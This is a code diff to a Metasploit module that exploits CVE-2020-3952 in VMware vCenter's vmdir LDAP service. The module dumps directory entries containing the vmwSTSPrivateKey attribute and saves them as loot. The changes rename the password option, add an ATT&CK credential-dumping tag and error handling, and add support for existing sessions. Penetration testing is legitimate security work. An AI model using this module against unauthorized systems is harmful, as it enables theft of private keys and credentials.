@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
           the vmdir service in VMware vCenter Server version 6.7 prior to the
           6.7U3f update, only if upgraded from a previous release line, such as
           6.0 or 6.5.
-          If the bind username and password are provided (BIND_DN and BIND_PW
+          If the bind username and password are provided (BIND_DN and LDAPPassword
           options), these credentials will be used instead of attempting an
           anonymous bind.
         },
@@ -29,7 +29,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           ['CVE', '2020-3952'],
-          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
+          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING]
         ],
         'DisclosureDate' => '2020-04-09', # Vendor advisory
         'License' => MSF_LICENSE,
@@ -91,20 +92,27 @@ class MetasploitModule < Msf::Auxiliary
 
       # Look for an entry with a non-empty vmwSTSPrivateKey attribute
       unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }
-        print_error("#{ldap.peerinfo} is NOT vulnerable to CVE-2020-3952") unless datastore['BIND_PW'].present?
+        print_error("#{ldap.peerinfo} is NOT vulnerable to CVE-2020-3952") unless datastore['LDAPPassword'].present?
         print_error('Dump failed')
-        return Exploit::CheckCode::Safe
+        return Exploit::CheckCode::Safe('Dump did not contain expected vmwSTSPrivateKey attribute')
       end
 
-      print_good("#{ldap.peerinfo} is vulnerable to CVE-2020-3952") unless datastore['BIND_PW'].present?
+      print_good("#{ldap.peerinfo} is vulnerable to CVE-2020-3952") unless datastore['LDAPPassword'].present?
       pillage(entries)
 
       # HACK: Stash discovered base DN in CheckCode reason
       Exploit::CheckCode::Vulnerable(base_dn)
     end
+  rescue Errno::ECONNRESET
+    fail_with(Failure::Disconnected, 'The connection was reset.')
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::NoAccess, e.message)
+  rescue Rex::Proto::LDAP::LdapException => e
+    fail_with(Failure::NoAccess, e.message)
   rescue Net::LDAP::Error => e
-    print_error("#{e.class}: #{e.message}")
-    Exploit::CheckCode::Unknown
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
   def pillage(entries)
@@ -116,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
     ldif_filename = store_loot(
       name, # ltype
       'text/plain', # ctype
-      rhost, # host
+      session ? session.client.peerhost : rhost, # host
       ldif, # data
       nil, # filename
       "Base DN: #{base_dn}" # info
@@ -148,8 +156,8 @@ class MetasploitModule < Msf::Auxiliary
       workspace_id: myworkspace_id,
       module_fullname: fullname,
       origin_type: :service,
-      address: rhost,
-      port: rport,
+      address: session ? session.client.peerhost : rhost,
+      port: session ? session.client.peerport : rport,
       protocol: 'tcp',
       service_name: 'vmdir/ldap'
     }
